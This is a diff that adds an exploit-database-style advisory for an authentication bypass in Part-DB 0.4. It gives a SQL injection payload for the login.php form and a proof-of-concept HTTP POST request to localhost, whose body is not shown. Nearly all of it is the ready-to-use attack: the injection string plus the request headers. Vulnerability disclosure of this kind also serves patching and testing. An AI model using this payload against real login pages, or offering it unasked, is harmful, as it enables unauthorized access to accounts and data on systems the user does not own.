@@ -1,0 +1,34 @@
+# Exploit Title: Part-DB 0.4 - Authentication Bypass
+# Date: 2019-10-26
+# Author: Marvoloo
+# Vendor Homepage: https://github.com/Part-DB/Part-DB/
+# Software Link: https://github.com/Part-DB/Part-DB/archive/master.zip
+# Version: 0.4
+# Tested on: Linux
+# CVE : N/A
+
+# Discription:
+# Easy authentication bypass vulnerability on the application 
+# allowing the attacker to login
+
+# url: http://localhost/login.php
+# Parameter & Payload: 
+
+'=''or'
+
+#vulnerable file: login.php Line: 29,30 
+
+#POC
+POST /login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+Cookie: ....
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
